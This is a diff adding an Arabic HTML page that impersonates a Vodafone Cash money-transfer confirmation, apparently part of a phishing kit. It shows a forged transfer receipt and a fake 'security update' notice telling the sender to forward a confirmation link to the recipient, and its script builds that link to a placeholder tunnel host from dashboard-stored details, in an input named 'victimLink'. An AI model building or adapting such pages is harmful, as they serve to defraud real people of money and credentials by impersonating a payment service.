@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>فودافون كاش - تحويل</title>
+    <style>
+        /* نفس الـ CSS اللي عندك، مش هغيره */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Tahoma', Arial, sans-serif;
+        }
+        body {
+            background: #f4f6f9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            direction: rtl;
+            padding: 16px;
+        }
+        .container {
+            max-width: 420px;
+            width: 100%;
+            background: #ffffff;
+            border-radius: 24px;
+            padding: 32px 24px 28px;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.08);
+            border: 1px solid #e9ecef;
+        }
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 28px;
+            padding-bottom: 16px;
+            border-bottom: 2px solid #f0f2f5;
+        }
+        .header .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .header .logo img {
+            height: 50px;
+            width: auto;
+        }
+        .header .logo span {
+            font-size: 20px;
+            font-weight: 700;
+            color: #e60000;
+        }
+        .header .logo-rounded img {
+            height: 40px;
+            width: 40px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 2px solid #e60000;
+        }
+        h1 {
+            text-align: center;
+            font-size: 22px;
+            color: #1a1a1a;
+            margin-bottom: 4px;
+        }
+        .main-amount {
+            text-align: center;
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+        .main-amount .number {
+            color: #000000;
+        }
+        .main-amount .currency {
+            color: #28a745;
+        }
+        .subtitle {
+            text-align: center;
+            color: #6b6b6b;
+            font-size: 14px;
+            margin-bottom: 24px;
+        }
+        .info-box {
+            background: #f8f9fc;
+            border-radius: 16px;
+            padding: 18px 20px;
+            margin-bottom: 24px;
+            border: 1px solid #e9ecef;
+        }
+        .info-box .row {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            font-size: 15px;
+            border-bottom: 1px dashed #e9ecef;
+        }
+        .info-box .row:last-child {
+            border-bottom: none;
+        }
+        .info-box .label {
+            color: #6b6b6b;
+            font-weight: 500;
+        }
+        .info-box .value {
+            color: #1a1a1a;
+            font-weight: 600;
+        }
+        .notice-box {
+            background: #fff3f3;
+            border-right: 5px solid #e60000;
+            padding: 14px 18px;
+            border-radius: 12px;
+            margin: 16px 0 20px;
+            font-size: 14px;
+            color: #4a4a4a;
+            line-height: 1.8;
+        }
+        .notice-box strong {
+            color: #e60000;
+            display: block;
+            font-size: 15px;
+            margin-bottom: 4px;
+        }
+        .notice-box .highlight {
+            color: #e60000;
+            font-weight: 700;
+        }
+        .link-section {
+            background: #f8f9fc;
+            border-radius: 16px;
+            padding: 18px 20px;
+            margin: 20px 0 16px;
+            border: 2px dashed #d0d0d0;
+        }
+        .link-section .instruction {
+            font-weight: 700;
+            font-size: 15px;
+            color: #e60000;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+        .link-box {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+        }
+        .link-box input {
+            flex: 1;
+            padding: 12px 14px;
+            border: 2px solid #d0d0d0;
+            border-radius: 12px;
+            font-size: 14px;
+            background: #ffffff;
+            direction: ltr;
+            text-align: left;
+            color: #1a1a2e;
+        }
+        .link-box input:focus {
+            border-color: #e60000;
+            outline: none;
+        }
+        .btn-copy {
+            background: #28a745;
+            color: white;
+            border: none;
+            padding: 10px 18px;
+            border-radius: 30px;
+            font-weight: 700;
+            font-size: 14px;
+            cursor: pointer;
+            transition: 0.2s;
+            white-space: nowrap;
+        }
+        .btn-copy:hover {
+            background: #218838;
+        }
+        .btn {
+            padding: 12px 20px;
+            border: none;
+            border-radius: 30px;
+            font-weight: 700;
+            font-size: 15px;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .btn-primary {
+            background: #e60000;
+            color: white;
+            width: 100%;
+        }
+        .btn-primary:hover {
+            background: #cc0000;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            border-top: 1px solid #eee;
+            padding-top: 16px;
+            font-size: 12px;
+            color: #a0a0a0;
+        }
+        .footer .lock {
+            color: #6b6b6b;
+        }
+        @media (max-width: 480px) {
+            .container { padding: 20px 16px; }
+            .header .logo span { font-size: 17px; }
+            .main-amount { font-size: 24px; }
+            .link-box { flex-wrap: wrap; }
+            .btn-copy { width: 100%; text-align: center; }
+            .header .logo img { height: 40px; }
+            .header .logo-rounded img { height: 35px; width: 35px; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header">
+        <div class="logo">
+            <img src="vodafone_cash.png" alt="Vodafone" style="height:50px;">
+            <span>فودافون كاش</span>
+        </div>
+        <div class="logo-rounded">
+            <img src="vf_logo.webp" alt="Logo">
+        </div>
+    </div>
+
+    <h1>تحويل فودافون كاش</h1>
+    <div class="main-amount">
+        <span class="number" id="amountNumber">600</span>
+        <span class="currency">جنيه</span>
+    </div>
+    <p class="subtitle">بيانات التحويل</p>
+
+    <div class="info-box">
+        <div class="row">
+            <span class="label">من</span>
+            <span class="value" id="senderDisplay">01012345678</span>
+        </div>
+        <div class="row">
+            <span class="label">إلى</span>
+            <span class="value" id="receiverDisplay">01008652784</span>
+        </div>
+        <div class="row">
+            <span class="label">اسم المستلم</span>
+            <span class="value" id="nameDisplay">خالد ع** م*** ا*****</span>
+        </div>
+        <div class="row">
+            <span class="label">رقم التحويل</span>
+            <span class="value">VOD-2026-07-11-2847</span>
+        </div>
+    </div>
+
+    <div class="notice-box">
+        <strong>تحديث سياسات الأمان</strong>
+        حرصاً منا على سلامة أموالكم، تم تحديث سياسات التحقق من الهوية.  
+        <span class="highlight">يجب على المستلم تأكيد العملية</span> عبر الرابط أدناه لإتمام التحويل.  
+        في حال عدم التأكيد خلال 24 ساعة، سيتم إلغاء التحويل تلقائياً.
+    </div>
+
+    <div class="link-section">
+        <div class="instruction">يرجى إرسال الرابط التالي للمستلم لعمل التأكيد</div>
+        <div class="link-box">
+            <input type="text" id="victimLink" value="https://your-serveo-link.com/receiver.html" readonly>
+            <button class="btn-copy" onclick="copyLink()">نسخ الرابط</button>
+        </div>
+    </div>
+
+    <button class="btn btn-primary" onclick="window.print()">تاكيد </button>
+
+    <div class="footer">
+        <div class="lock">تحويل آمن ومشفر</div>
+        <div style="margin-top:6px;">2026 فودافون مصر - جميع الحقوق محفوظة</div>
+    </div>
+</div>
+
+<script>
+    // ====== قراءة البيانات من localStorage ======
+    function loadFromDashboard() {
+        const stored = localStorage.getItem('dashboardData');
+        if (!stored) return;
+        const data = JSON.parse(stored);
+        
+        if (document.getElementById('senderDisplay')) {
+            document.getElementById('senderDisplay').innerText = data.senderPhone || '01012345678';
+        }
+        if (document.getElementById('receiverDisplay')) {
+            document.getElementById('receiverDisplay').innerText = data.receiverPhone || '01008652784';
+        }
+        if (document.getElementById('nameDisplay')) {
+            document.getElementById('nameDisplay').innerText = data.receiverName || 'خالد ع** م*** ا*****';
+        }
+        if (document.getElementById('amountNumber')) {
+            document.getElementById('amountNumber').innerText = data.amount || '600';
+        }
+        
+        // توليد الرابط بعد تحديث البيانات
+        generateLink();
+    }
+
+    // ====== توليد الرابط بناءً على البيانات المعروضة ======
+    function generateLink() {
+        const sender = document.getElementById('senderDisplay').innerText || '01012345678';
+        const receiver = document.getElementById('receiverDisplay').innerText || '01008652784';
+        const name = document.getElementById('nameDisplay').innerText || 'خالد ع** م*** ا*****';
+        const amount = document.getElementById('amountNumber').innerText || '600';
+
+        const baseUrl = 'https://your-serveo-link.com/receiver.html';
+        const params = new URLSearchParams({
+            sender: sender,
+            receiver: receiver,
+            name: name,
+            amount: amount
+        });
+        const fullLink = baseUrl + '?' + params.toString();
+        document.getElementById('victimLink').value = fullLink;
+    }
+
+    // ====== نسخ الرابط ======
+    function copyLink() {
+        const input = document.getElementById('victimLink');
+        input.select();
+        document.execCommand('copy');
+        alert('تم نسخ الرابط');
+    }
+
+    // ====== تحميل البيانات عند فتح الصفحة ======
+    window.onload = loadFromDashboard;
+</script>
+
+</body>
+</html>
